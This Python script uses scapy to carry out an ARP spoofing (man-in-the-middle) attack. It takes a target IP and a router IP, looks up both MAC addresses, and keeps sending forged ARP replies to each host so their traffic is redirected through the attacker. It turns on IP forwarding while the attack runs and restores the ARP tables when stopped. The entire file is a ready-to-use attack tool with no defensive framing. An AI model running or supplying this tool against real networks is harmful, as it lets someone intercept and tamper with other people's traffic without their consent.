import optparse
import scapy.all as scapy
import time
import subprocess

# Returns: Target ip and Gateway (router) IP
def get_user_input() -> tuple[str, str]:
    parse_input = optparse.OptionParser()
    parse_input.add_option("-t", "--target", dest="target_ip", help="Target device IP")
    parse_input.add_option("-r", "--router", dest="router_ip", help="The router IP")

    user_options = parse_input.parse_args()[0]
    target_ip = user_options.target_ip
    router_ip = user_options.router_ip

    if not target_ip:
        print("Enter Target IP Address.")
        raise SystemExit
    elif not router_ip:
        print("Enter Router IP Address.")
        raise SystemExit

    return (target_ip, router_ip)

def get_mac(ip: str) -> str:
    arp_request_packet = scapy.ARP(pdst=ip)

    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combined_packet = broadcast_packet / arp_request_packet
    result = scapy.srp(combined_packet, timeout=1, verbose=False)  # We can use "sr" function to only send package to a specific target, "srp" is for broadcasts

    return result[0][0][1].hwsrc

def send_arp_spoofing(target_ip: str, router_ip: str, set_source_as_target : bool = False):
    router_mac = get_mac(router_ip)
    target_mac = get_mac(target_ip)

    if set_source_as_target:
        arp_packet = scapy.ARP(pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac, op=2)
    else:
        arp_packet = scapy.ARP(pdst=router_ip, hwdst=router_mac, psrc=target_ip, op=2)

    ether_pack = scapy.Ether(src=target_mac, dst=router_mac)
    combined_pack = ether_pack / arp_packet
    scapy.sendp(combined_pack, iface='eth0', verbose=False)

    if set_source_as_target:
        arp_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=router_ip,hwsrc=router_mac, op=2)
    else:
        arp_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=router_ip, op=2)

    ether_pack = scapy.Ether(src=router_mac, dst=target_mac)
    combined_pack = ether_pack / arp_packet
    scapy.sendp(combined_pack, iface='eth0', verbose=False)

def reset_arp_spoofing(target_ip: str, router_ip: str):
    send_arp_spoofing(target_ip, router_ip, True)

def set_ip_forwarding(open_ip_forwarding: bool):
    print("Checking IP Forwarding...")
    print("")
    output = subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"], text=True)

    if open_ip_forwarding:
        if "0" in output:
            print("IP Forwarding is not active. Activating IP Forwarding...")
            subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            time.sleep(0.5)
            set_ip_forwarding(open_ip_forwarding)
        elif "1" in output:
            print("IP Forwarding is Active!")
    else:
        if "0" in output:
            print("IP Forwarding is deactivated.")
        elif "1" in output:
            print("IP Forwarding is Active... Disabling IP Forwarding")
            subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
            time.sleep(0.5)
            set_ip_forwarding(open_ip_forwarding)

target_ip = get_user_input()[0]
router_ip = get_user_input()[1]

set_ip_forwarding(True)

print("\nStarting ARP Spoofing!\n")

sent_packets = 0

try:
    while True:
        send_arp_spoofing(target_ip, router_ip)
        sent_packets += 1
        print(f"\rSent {sent_packets} Packet{"s" if sent_packets > 1 else ""}...", end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuiting...\n")
    print("\nResetting ARP Spoofing...\n")
    reset_arp_spoofing(target_ip, router_ip)

    time.sleep(0.5)

    print("ARP Spoofing Settings Resetted")
    print("\nDeactivating IP Forwarding...")

    time.sleep(0.5)

    set_ip_forwarding(False)

    print("\nQuiting\n")